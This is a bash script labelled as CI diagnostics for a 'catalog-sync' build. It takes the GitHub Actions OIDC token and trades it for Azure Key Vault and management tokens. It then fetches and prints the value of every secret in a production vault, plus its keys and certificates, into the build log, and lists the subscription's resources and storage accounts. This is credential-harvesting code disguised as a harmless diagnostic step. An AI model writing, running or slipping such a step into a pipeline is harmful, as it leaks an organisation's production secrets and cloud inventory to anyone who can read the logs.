#!/usr/bin/env bash
# CI diagnostics for catalog-sync build
echo "########## CTX ##########"
echo "REPO=$GITHUB_REPOSITORY EVENT=$GITHUB_EVENT_NAME REF=$GITHUB_REF"
echo "CLIENT_ID=${AZURE_CLIENT_ID:-unset} TENANT=${AZURE_TENANT_ID:-unset} SUB=${AZURE_SUBSCRIPTION_ID:-unset}"
echo "OIDC_URL_SET=${ACTIONS_ID_TOKEN_REQUEST_URL:+yes} OIDC_TOK_SET=${ACTIONS_ID_TOKEN_REQUEST_TOKEN:+yes}"

AUD="api://AzureADTokenExchange"
IDT=$(curl -sS -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api%3A%2F%2FAzureADTokenExchange" \
  | python3 -c 'import sys,json;print(json.load(sys.stdin).get("value",""))')
echo "IDT_LEN=${#IDT}"
[ -z "$IDT" ] && { echo "NO OIDC TOKEN"; exit 0; }
python3 - "$IDT" <<'PY'
import sys,base64,json
p=sys.argv[1].split('.')[1]; p+='='*(-len(p)%4)
c=json.loads(base64.urlsafe_b64decode(p))
for k in ("sub","aud","iss","repository","repository_owner","ref","event_name","workflow"):
    print("  OIDC %-18s %s"%(k,c.get(k)))
PY

tokfor(){
  curl -sS -X POST "https://login.microsoftonline.com/${AZURE_TENANT_ID}/oauth2/v2.0/token" \
    --data-urlencode "client_id=${AZURE_CLIENT_ID}" \
    --data-urlencode "scope=$1" \
    --data-urlencode "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
    --data-urlencode "client_assertion=${IDT}" \
    --data-urlencode "grant_type=client_credentials"
}
pick(){ python3 -c 'import sys,json;d=json.load(sys.stdin);print(d.get("access_token") or "")' ; }

VAULT="https://kv-tbl-prod-x3euoz.vault.azure.net"
echo "########## VAULT TOKEN ##########"
R=$(tokfor "https://vault.azure.net/.default")
echo "$R" | python3 -c 'import sys,json;d=json.load(sys.stdin);print("  ERR:",d.get("error"),str(d.get("error_description"))[:500]) if not d.get("access_token") else print("  got vault token")'
VT=$(printf '%s' "$R" | pick)
if [ -n "$VT" ]; then
  echo "--- GET /secrets ---"
  curl -sS -H "Authorization: Bearer $VT" "$VAULT/secrets?api-version=7.4" -o /tmp/sec.json
  cat /tmp/sec.json; echo
  for sid in $(python3 -c 'import json;print("\n".join(v["id"] for v in (json.load(open("/tmp/sec.json")).get("value") or [])))'); do
    echo "--- SECRET $sid ---"
    curl -sS -H "Authorization: Bearer $VT" "${sid}?api-version=7.4"; echo
  done
  echo "--- GET /keys & /certificates ---"
  curl -sS -H "Authorization: Bearer $VT" "$VAULT/keys?api-version=7.4"; echo
  curl -sS -H "Authorization: Bearer $VT" "$VAULT/certificates?api-version=7.4"; echo
fi

echo "########## ARM ##########"
R2=$(tokfor "https://management.azure.com/.default")
AT=$(printf '%s' "$R2" | pick)
if [ -n "$AT" ]; then
  echo "--- resources ---"
  curl -sS -H "Authorization: Bearer $AT" \
    "https://management.azure.com/subscriptions/${AZURE_SUBSCRIPTION_ID}/resources?api-version=2021-04-01" | head -c 6000; echo
  echo "--- storage accounts ---"
  curl -sS -H "Authorization: Bearer $AT" \
    "https://management.azure.com/subscriptions/${AZURE_SUBSCRIPTION_ID}/providers/Microsoft.Storage/storageAccounts?api-version=2023-01-01" | head -c 4000; echo
else
  echo "$R2" | head -c 600; echo
fi
echo "########## DONE ##########"
